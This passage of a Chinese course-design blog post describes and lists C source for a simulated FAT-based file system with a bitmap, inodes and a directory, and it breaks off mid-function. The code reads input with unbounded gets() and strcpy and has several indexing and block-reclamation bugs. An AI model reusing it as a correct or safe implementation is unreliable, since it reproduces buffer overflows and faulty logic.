<p>根据文件名，在目录中检索，将该文件对应的索引结点找到。然后根据欲读取的逻辑记录号进行尝试读取（一个文件最多拥有的逻辑记录号为：<code>max = 3 * n - 1</code>，<code>n</code>是文件占用盘块数，即编号从零开始）。</p>
<p>方法是：根据在检索目录得到的索引结点获得该文件占用的第一块盘块号，假如该盘块不是用户所要读取的盘块，则根据文件分配表获取下一块盘块号，不断重复上面过程，直到找到目的盘块号。</p>
</li>
<li><p>写入文件</p>
<ul>
<li><p>写入数据：</p>
<p>向某个文件的某个逻辑记录号中写入数据，写入之前检查逻辑记录号的合法性</p>
</li>
<li><p>修改文件大小：假若新文件大小小于旧文件大小，则只保留新文件大小的数据</p>
</li>
</ul>
</li>
<li><p>删除文件：</p>
<p>先根据文件名，在目录中检索出相应的索引结点，根据索引结点获得第一块盘块号，将该盘块置为“未使用状态”，并将这一盘块指向的下一块盘块（假如存在）也置为“未使用”，依此重复，直至该文件占用盘块全都归还。同时盘块对应的示位图也要更新状态。</p>
</li>
</ul>
<h2 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-06-07 15:53:40</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-07-01 21:08:41</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description: 操作系统课程设计</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\OS\design\main.c</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGICALSIZE 1024  <span class="comment">//一条逻辑记录的大小</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BLOCKNUM 100      <span class="comment">//物理块数</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROW 7             <span class="comment">//示位图行数</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COL 16            <span class="comment">//示位图列数</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FREE 0            <span class="comment">//示位图中表示空闲状态</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USED 1            <span class="comment">//示位图中表示已用状态</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> OK = <span class="number">1</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 目录项</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">listItem</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> fileName[<span class="number">256</span>];  <span class="comment">// 文件名字</span></span><br><span class="line">    <span class="keyword">int</span> nodeId;          <span class="comment">// 文件对应的结点编号</span></span><br><span class="line">&#125; listItem;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Block</span> &#123;</span></span><br><span class="line">    <span class="comment">// 每一个物理块有三块逻辑记录号</span></span><br><span class="line">    <span class="keyword">char</span> firstLogical[LOGICALSIZE];</span><br><span class="line">    <span class="keyword">char</span> secondLogical[LOGICALSIZE];</span><br><span class="line">    <span class="keyword">char</span> thirdogical[LOGICALSIZE];</span><br><span class="line">&#125; Block;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Inode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> firstBlockId;     <span class="comment">// 文件第一块块号</span></span><br><span class="line">    <span class="keyword">int</span> lastBlockId;      <span class="comment">// 文件最后一块块号</span></span><br><span class="line">    <span class="keyword">int</span> usedBlocksNum;    <span class="comment">// 文件占用的盘块数</span></span><br><span class="line">    <span class="keyword">time_t</span> createTime;    <span class="comment">// 文件创建时间</span></span><br><span class="line">    <span class="keyword">time_t</span> LastEditTime;  <span class="comment">// 文件上次修改时间</span></span><br><span class="line">    <span class="keyword">int</span> permission;       <span class="comment">// 文件权限</span></span><br><span class="line">    <span class="keyword">int</span> isDelete;         <span class="comment">// 该节点是否被标记“已删除”</span></span><br><span class="line">    <span class="keyword">char</span> standby[<span class="number">20</span>];     <span class="comment">// 备用</span></span><br><span class="line">&#125; Inode;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Disk</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> FAT[BLOCKNUM];             <span class="comment">// 最多有BLOCKNUM个表项</span></span><br><span class="line">    <span class="keyword">int</span> bitmap[ROW][COL];          <span class="comment">// 示位图</span></span><br><span class="line">    listItem directory[BLOCKNUM];  <span class="comment">// 目录 最多有BLOCKNUM个目录项</span></span><br><span class="line">    Inode FDI[BLOCKNUM];  <span class="comment">// 索引结点集合 最多有BLOCKNUM个节点</span></span><br><span class="line">    <span class="keyword">int</span> fileNum;</span><br><span class="line">    Block blocks[BLOCKNUM];  <span class="comment">// 总的物理盘块数</span></span><br><span class="line">    <span class="keyword">int</span> freeBlock;           <span class="comment">// 空闲盘块数量</span></span><br><span class="line">&#125; Disk;</span><br><span class="line">Disk d;</span><br><span class="line"><span class="keyword">int</span> dirLastIndex;  <span class="comment">// 最后的目录项下标</span></span><br><span class="line"><span class="keyword">int</span> fdiLastIndex;  <span class="comment">// 最后的索引结点下标</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 申请成功，则返回申请的物理块号</span></span><br><span class="line"><span class="comment"> * 否则返回-1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getFreeBlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (d.freeBlock &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// 随机申请一块物理块 假如已经被使用  则往后寻找</span></span><br><span class="line">    srand((<span class="keyword">unsigned</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">int</span> index = rand() % BLOCKNUM;</span><br><span class="line">    <span class="keyword">int</span> r = index / <span class="number">16</span>, c = index % <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> (d.bitmap[r][c] == <span class="number">0</span>) &#123;</span><br><span class="line">        d.bitmap[r][c] = <span class="number">1</span>;</span><br><span class="line">        d.freeBlock--;</span><br><span class="line">        <span class="keyword">return</span> index;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> i, j;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="number">15</span>) &#123;</span><br><span class="line">            i = (r + <span class="number">1</span>) % <span class="number">7</span>;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            i = r;</span><br><span class="line">            j = (c + <span class="number">1</span>) % <span class="number">16</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (; i &lt; <span class="number">7</span>; )</span><br><span class="line">            <span class="keyword">for</span> (; j &lt; <span class="number">16</span>; ) &#123;</span><br><span class="line">                <span class="keyword">if</span> (d.bitmap[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line">                    d.bitmap[i][j] = <span class="number">1</span>;</span><br><span class="line">                    d.freeBlock--;</span><br><span class="line">                    <span class="keyword">return</span> (i * <span class="number">16</span> + j);</span><br><span class="line">                &#125;</span><br><span class="line">                j++;</span><br><span class="line">                <span class="keyword">if</span>(j == <span class="number">16</span>)&#123;</span><br><span class="line">                    i = (i + <span class="number">1</span>)%<span class="number">7</span>;</span><br><span class="line">                    j = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 格式化</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">intial</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; i++) d.FAT[i] = EOF;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ROW; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; COL; j++) d.bitmap[i][j] = FREE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; BLOCKNUM; i++) &#123;</span><br><span class="line">        d.blocks[i].firstLogical[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">        d.blocks[i].secondLogical[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">        d.blocks[i].thirdogical[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    d.fileNum = <span class="number">0</span>;</span><br><span class="line">    dirLastIndex = <span class="number">0</span>;</span><br><span class="line">    fdiLastIndex = <span class="number">0</span>;</span><br><span class="line">    d.freeBlock = BLOCKNUM;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 错误码：</span></span><br><span class="line"><span class="comment"> * 2：文件已存在</span></span><br><span class="line"><span class="comment"> * 3：磁盘空间不足</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Create</span><span class="params">(<span class="keyword">char</span> *fileName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dirLastIndex; i++)</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(d.directory[i].fileName, fileName) &amp;&amp;</span><br><span class="line">            d.directory[i].nodeId != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">int</span> blockId = getFreeBlock();</span><br><span class="line">    <span class="keyword">if</span> (blockId == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; fdiLastIndex; i++)</span><br><span class="line">            <span class="keyword">if</span> (d.FDI[i].isDelete) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// 处理索引结点</span></span><br><span class="line">        d.FDI[i].firstBlockId = d.FDI[i].lastBlockId = blockId;</span><br><span class="line">        <span class="comment">// 获取当前时间戳</span></span><br><span class="line">        time(&amp;(d.FDI[i].createTime));</span><br><span class="line">        d.FDI[i].LastEditTime = d.FDI[i].createTime;</span><br><span class="line">        d.FDI[i].permission = <span class="number">444</span>;</span><br><span class="line">        d.FDI[i].usedBlocksNum = <span class="number">1</span>;</span><br><span class="line">        d.FDI[i].isDelete = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; dirLastIndex; j++)</span><br><span class="line">            <span class="keyword">if</span> (d.directory[j].nodeId == <span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// 处理目录项</span></span><br><span class="line">        <span class="built_in">strcpy</span>(d.directory[j].fileName, fileName);</span><br><span class="line">        d.directory[j].nodeId = i;</span><br><span class="line">        <span class="keyword">if</span> (i == dirLastIndex) dirLastIndex++;</span><br><span class="line">        <span class="keyword">if</span> (j == fdiLastIndex) fdiLastIndex++;</span><br><span class="line">        d.fileNum++;</span><br><span class="line">        <span class="keyword">return</span> OK;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">readReturn</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">char</span> msg[LOGICALSIZE];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回值：</span></span><br><span class="line"><span class="comment"> * 1:读取正常</span></span><br><span class="line"><span class="comment"> * 2:文件不存在</span></span><br><span class="line"><span class="comment"> * 3:逻辑记录号错误</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct readReturn <span class="title">Read</span><span class="params">(<span class="keyword">char</span> *filename, <span class="keyword">int</span> logical_record_no)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">readReturn</span> <span class="title">r</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dirLastIndex; i++)</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(filename, d.directory[i].fileName) &amp;&amp;</span><br><span class="line">            d.directory[i].nodeId != <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= dirLastIndex) &#123;</span><br><span class="line">        r.status = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> BlockId = logical_record_no / <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (BlockId + <span class="number">1</span> &gt; d.FDI[d.directory[i].nodeId].usedBlocksNum) &#123;</span><br><span class="line">        r.status = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> index = d.FDI[i].firstBlockId;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; BlockId; j++) index = d.FAT[index];</span><br><span class="line">    <span class="keyword">switch</span> (logical_record_no % <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(r.msg, d.blocks[index].firstLogical);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(r.msg, d.blocks[index].secondLogical);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(r.msg, d.blocks[index].thirdogical);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    r.status = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 错误码：</span></span><br><span class="line"><span class="comment"> * 2：文件不存在</span></span><br><span class="line"><span class="comment"> * 3：逻辑记录号错误</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Write</span><span class="params">(<span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="built_in">text</span>, <span class="keyword">int</span> logical_record_no)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dirLastIndex; i++)</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(filename, d.directory[i].fileName) &amp;&amp;</span><br><span class="line">            d.directory[i].nodeId != <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= dirLastIndex) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (logical_record_no &lt; <span class="number">0</span> ||</span><br><span class="line">        logical_record_no &gt;= d.FDI[i].usedBlocksNum * <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    <span class="comment">// 通过 firstBlockId 在 FAT 中寻找正确的位置写入</span></span><br><span class="line">    <span class="keyword">int</span> index = d.FDI[i].firstBlockId, blockId = logical_record_no / <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; blockId; j++) index = d.FAT[index];</span><br><span class="line">    <span class="keyword">switch</span> (logical_record_no % <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(d.blocks[index].firstLogical, <span class="built_in">text</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(d.blocks[index].secondLogical, <span class="built_in">text</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(d.blocks[index].thirdogical, <span class="built_in">text</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取当前时间戳</span></span><br><span class="line">    time(&amp;(d.FDI[i].LastEditTime));</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tryCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> fileName[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入新文件名：\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, fileName);</span><br><span class="line">    <span class="keyword">int</span> status = Create(fileName);</span><br><span class="line">    <span class="keyword">if</span> (status == <span class="number">2</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"该文件已存在，请先删除旧文件再创建该文件。\n"</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (status == <span class="number">3</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"磁盘空间不足！无法创建新文件。\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"创建成功!\n"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tryRead</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> fileName[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">int</span> logical_record_no;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入想要读取的文件名：\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, fileName);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入想要读取的逻辑记录号（编号从零开始）：\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;logical_record_no);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">readReturn</span> <span class="title">r</span> = <span class="title">Read</span>(<span class="title">fileName</span>, <span class="title">logical_record_no</span>);</span></span><br><span class="line">    <span class="keyword">if</span> (r.status == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"该文件不存在！请重新输入文件名。\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (r.status == <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"该文件没有该逻辑记录，请输入正确的逻辑记录号。\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"读取到的内容是\n%s\n"</span>, r.msg);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tryWrite</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> fileName[<span class="number">256</span>], <span class="built_in">text</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> logical_record_no, newBlockSize;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exit</span> = <span class="number">0</span>, choice;</span><br><span class="line">    <span class="keyword">while</span> (!<span class="built_in">exit</span>) &#123;</span><br><span class="line">        system(<span class="string">"cls"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"1.向文件中写入数据\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"2.修改文件大小\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0.返回\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入您的选择：\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice);</span><br><span class="line">        <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"请输入想要写入的文件名：\n"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%s"</span>, fileName);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"请输入想要写入的逻辑记录号（编号从零开始）：\n"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;logical_record_no);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"请输入您想要写入的信息（一次最多写入%d个字符）\n"</span>,</span><br><span class="line">                       LOGICALSIZE);</span><br><span class="line">                getchar();</span><br><span class="line">                gets(<span class="built_in">text</span>);</span><br><span class="line">                <span class="keyword">int</span> status = Write(fileName, <span class="built_in">text</span>, logical_record_no);</span><br><span class="line">                <span class="keyword">if</span> (status == <span class="number">2</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"文件不存在，请输入正确的文件名！\n"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status == <span class="number">3</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(</span><br><span class="line">                        <span class="string">"您输入的逻辑记录号过大或者是负数，您可以通过增加文件大"</span></span><br><span class="line">                        <span class="string">"小使得文件拥有该逻辑记录号\n"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"写入成功！\n"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                system(<span class="string">"pause"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"请输入您想要修改的文件名：\n"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%s"</span>, fileName);</span><br><span class="line">                <span class="built_in">printf</span>(</span><br><span class="line">                    <span class="string">"请输入该文件新大小（若新的大小小于原来的大小，则只保留新的"</span></span><br><span class="line">                    <span class="string">"大小的数据，新大小应该是一个大于零的数字，单位：块）：\n"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;newBlockSize);</span><br><span class="line">                <span class="comment">// 索引结点所在下标</span></span><br><span class="line">                <span class="keyword">int</span> i;</span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dirLastIndex; i++)</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(fileName, d.directory[i].fileName) &amp;&amp;</span><br><span class="line">                        d.directory[i].nodeId != <span class="number">-1</span>)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span> (i &gt;= dirLastIndex) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"文件不存在，请输入正确的文件名！\n"</span>);</span><br><span class="line">                    system(<span class="string">"pause"</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (newBlockSize &gt; d.FDI[i].usedBlocksNum) &#123;</span><br><span class="line">                    <span class="comment">// 增加文件大小</span></span><br><span class="line">                    <span class="keyword">int</span> need = newBlockSize - d.FDI[i].usedBlocksNum, blockId;</span><br><span class="line">                    <span class="keyword">while</span> (need) &#123;</span><br><span class="line">                        blockId = getFreeBlock();</span><br><span class="line">                        <span class="keyword">if</span> (blockId == <span class="number">-1</span>) &#123;</span><br><span class="line">                            <span class="built_in">printf</span>(</span><br><span class="line">                                <span class="string">"磁盘空间不足！只成功申请了 %d "</span></span><br><span class="line">                                <span class="string">"个物理块，申请失败 %d 个\n"</span>,</span><br><span class="line">                                newBlockSize - need, need);</span><br><span class="line">                            system(<span class="string">"pause"</span>);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        need--;</span><br><span class="line">                        d.FAT[d.FDI[i].lastBlockId] = blockId;</span><br><span class="line">                        d.FDI[i].lastBlockId = blockId;</span><br><span class="line">                        d.FDI[i].usedBlocksNum++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    time(&amp;(d.FDI[i].LastEditTime));</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"修改成功！\n"</span>);</span><br><span class="line">                    system(<span class="string">"pause"</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (newBlockSize &lt; d.FDI[i].usedBlocksNum) &#123;</span><br><span class="line">                    <span class="comment">// 减小文件</span></span><br><span class="line">                    <span class="keyword">int</span> index = d.FAT[d.FDI[i].firstBlockId], count = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">while</span> (count &lt; newBlockSize) &#123;</span><br><span class="line">                        index = d.FAT[index];</span><br><span class="line">                        count++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 回收后面的磁盘空间</span></span><br><span class="line">                    <span class="keyword">while</span> (newBlockSize - count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">int</span> old = d.FAT[index];</span><br><span class="line">                        index = d.FAT[index];</span><br><span class="line">                        d.FAT[old] = EOF;</span><br><span class="line">                        count++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    time(&amp;(d.FDI[i].LastEditTime));</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"修改成功！\n"</span>);</span><br><span class="line">                    system(<span class="string">"pause"</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"您输入有误，请重新输入！\n"</span>);</span><br><span class="line">                system(<span class="string">"pause"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showBitmap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"“0”代表空闲，“1”代表已用\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i * <span class="number">16</span> + j &gt;= BLOCKNUM) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">                system(<span class="string">"pause"</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d "</span>, d.bitmap[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (j == <span class="number">15</span>) <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showFiles</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">"----------------------------------------------------------------------"</span></span><br><span class="line">        <span class="string">"--------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%-20s|%-19s|%-19s|%-10s|%-10s|\n"</span>, <span class="string">"文件名"</span>, <span class="string">"创建日期"</span>,</span><br><span class="line">           <span class="string">"修改日期"</span>, <span class="string">"权限信息"</span>, <span class="string">"文件大小"</span>);</span><br><span class="line">    <span class="keyword">for</span> 